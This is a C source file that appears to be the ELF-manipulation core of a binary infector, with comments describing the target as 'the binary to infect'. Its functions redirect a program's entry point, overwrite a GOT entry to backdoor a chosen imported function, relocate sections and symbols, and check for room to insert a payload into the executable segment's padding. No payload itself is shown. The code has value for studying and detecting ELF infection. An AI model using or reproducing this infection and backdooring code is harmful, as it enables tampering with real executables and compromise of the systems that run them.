#include <stdlib.h>
#include <elf.h>
#include <string.h>
#include <stdbool.h>

#include "elf-parser.h"
#include "log.h"
#include "utils.h"

Elf64_Ehdr *elf_header;
Elf64_Shdr *section_table;
Elf64_Shdr *string_table_section;
Elf64_Shdr *dyn_section;
Elf64_Shdr *text_section;

/**
 * setup_elf(): Setup some global variables with the binary to infect
 * @file_content: Binary file data
 *
 * Extract the ELF header, the section table, string table, the dynamic section and the text section from the target binary
 */
void setup_elf(byte *file_content) {
    elf_header = (Elf64_Ehdr *) file_content;
    section_table = (Elf64_Shdr *)(file_content + elf_header->e_shoff);
    string_table_section = &(section_table[elf_header->e_shstrndx]);
    dyn_section = get_section_by_name(".dynamic");
    text_section = get_section_by_name(".text");
}

/**
 * get_entry_point(): Get the entry point of the target binary
 *
 * Return: Original entry point of the target
 */
Elf64_Addr get_entry_point() {
    return elf_header->e_entry;
}

/**
 * set_entry_point(): Change the current entry point of the target
 * @vaddr: Virtual address that will be the new entry point
 */
void set_entry_point(Elf64_Addr vaddr) {
    elf_header->e_entry = vaddr;
}

/**
 * change_got(): Change an address in the got table
 * @vaddr: New address to set in the got table
 * @target_function: Name of the function to backdoor
 *
 * Change an address into the got table in order to backdoor only a specific function
 *
 * Return: Original address stored into the table
 */
Elf64_Addr change_got(Elf64_Addr vaddr, char *target_function) {
    Elf64_Shdr *gotplt = get_section_by_name(".got.plt");
    Elf64_Shdr *relaplt = get_section_by_name(".rela.plt");
    Elf64_Shdr *dynstr = get_section_by_name(".dynstr");
    Elf64_Shdr *dynsym = get_section_by_name(".dynsym");

    Elf64_Addr old_addr = 0;

    Elf64_Sym *dynsym_table = (Elf64_Sym *)((byte *)elf_header + dynsym->sh_offset);
    char *func_names = (char *)((byte *)elf_header + dynstr->sh_offset);
    Elf64_Rela *dynamic_table = (Elf64_Rela *)((byte *)elf_header + relaplt->sh_offset);

    for (uint16_t i = 0; i < relaplt->sh_size / sizeof(Elf64_Rela); i++) {
        if (!strcmp(target_function, &(func_names[dynsym_table[ELF64_R_SYM(dynamic_table[i].r_info)].st_name]))) {
            SUCCESS("Found the function %s in the section .plt.got at offset %lx", target_function, dynamic_table[i].r_offset - (gotplt->sh_addr - gotplt->sh_offset));
            old_addr = *(Elf64_Addr *)((byte *)elf_header + dynamic_table[i].r_offset - (gotplt->sh_addr - gotplt->sh_offset));
            *(Elf64_Addr *)((byte *)elf_header + dynamic_table[i].r_offset - (gotplt->sh_addr - gotplt->sh_offset)) = vaddr;
            return old_addr;
        }
    }

    /* Should never happen */
    ERROR("Function %s not found in the dynsym", target_function);
}

/**
 * get_section_by_name(): Get the structure associated to the section in the section table
 * @section_name: Name of the section we want to have
 *
 * Use the section string table in order to get data according to a specific function
 *
 * Return: Pointer to a section header or NULL if the section does not exists
 */
Elf64_Shdr *get_section_by_name(const char *section_name)
{
    for (uint16_t i = 0; i < elf_header->e_shnum; i++) {
        if ( strcmp(section_name, (void *)elf_header + string_table_section->sh_offset + section_table[i].sh_name) == 0 ){
            return &(section_table[i]);
        }
    }
    return NULL;
}

/**
 * get_exe_segment(): Find an executable segment
 *
 * Get the first executable segment available in the target binary
 *
 * Return: Pointer to a segment header
 */
Elf64_Phdr *get_exe_segment(void) 
{
    Elf64_Phdr *program_headers = (Elf64_Phdr *)((void *)elf_header + elf_header->e_phoff);
    static uint8_t i = 0;
    if (elf_header->e_phoff == 0) {
        ERROR("No programm header for this one", NULL);
    }
    
    for (; i < elf_header->e_phnum; i++) {
        if ((program_headers[i].p_flags & PF_X) && (program_headers[i].p_type & PT_LOAD)) {
            SUCCESS("Executable segment found ! Virtual @ %lu", program_headers[i].p_vaddr);
            return &(program_headers[i]);
        }
    }

    return NULL;
}

/**
 * section_in_segment(): Check if a section is in a segment
 * @section: Section header
 * @segment: Segment header
 *
 * Return: True if @section is in @segment
 */
bool section_in_segment(Elf64_Shdr *section, Elf64_Phdr *segment) {
    byte *segment_base = (byte *)elf_header + segment->p_offset;
    byte *section_base = (byte *)elf_header + section->sh_offset;
    return segment_base <= section_base && section_base <= segment_base + segment->p_filesz;
}

/**
 * update_symbol(): Change value in the symbol table
 * @name: Name of the symbol to change
 * @value: New value for the symbol
 *
 * Change the value associated to the symbol @name with @value
 */
void update_symbol(const char *name, int64_t value) {
    Elf64_Shdr *symtab = get_section_by_name(".symtab");
    if (!symtab) {
        fprintf(stderr, "No symtab\n");
        return;
    }
    Elf64_Shdr *string_table = get_section_by_name(".strtab");
    Elf64_Sym *symtable = (Elf64_Sym *)(((byte *)elf_header) + symtab->sh_offset);
    for (uint64_t i = 0; i < (symtab->sh_size / sizeof(Elf64_Sym)); i++) {
        if (strcmp(name, (char *)((byte *)elf_header + string_table->sh_offset + symtable[i].st_name)) == 0) {
            symtable[i].st_value += value;
        }
    }
}

/**
 * update_section(): Update section information
 * @name: Name of the section to change
 * @value: Value to add to the offset and the address of the section @name
 *
 * Retrieve the section header associated to @name and add @value to the fields sh_offset and sh_addr
 */
void update_section(const char *name, int64_t value) {
    Elf64_Shdr *target_section = get_section_by_name(name);
    target_section->sh_offset += value;
    target_section->sh_addr += value;
}

/**
 * update_dynsym(): Update the dynsym section
 * @symbol: Symbol to update
 * @value: Value to add
 */
void update_dynsym(Elf64_Xword symbol, int64_t value) {
    Elf64_Dyn *table = (Elf64_Dyn *)((byte *)elf_header + dyn_section->sh_offset);
    while (table->d_tag != DT_NULL) {
        if (table->d_tag == symbol) {
            table->d_un.d_ptr += value;
            return;
        }
	table += 1;
    }
}

/**
 * check_payload_place(): Check if a payload can be inserted
 * @payload_size: Size of the payload to insert
 *
 * The payload should be smaller than the space between the executable segment and the next one
 */
void check_payload_place(uint64_t payload_size) {
    uint64_t available_place = (PAGE_SIZE - (text_section->sh_size & (PAGE_SIZE - 1)));
    if (payload_size > available_place) {
        ERROR("The payload is too big to be insert. Payload size : 0x%lx - Available place 0x%lx", payload_size, available_place);
    }
}
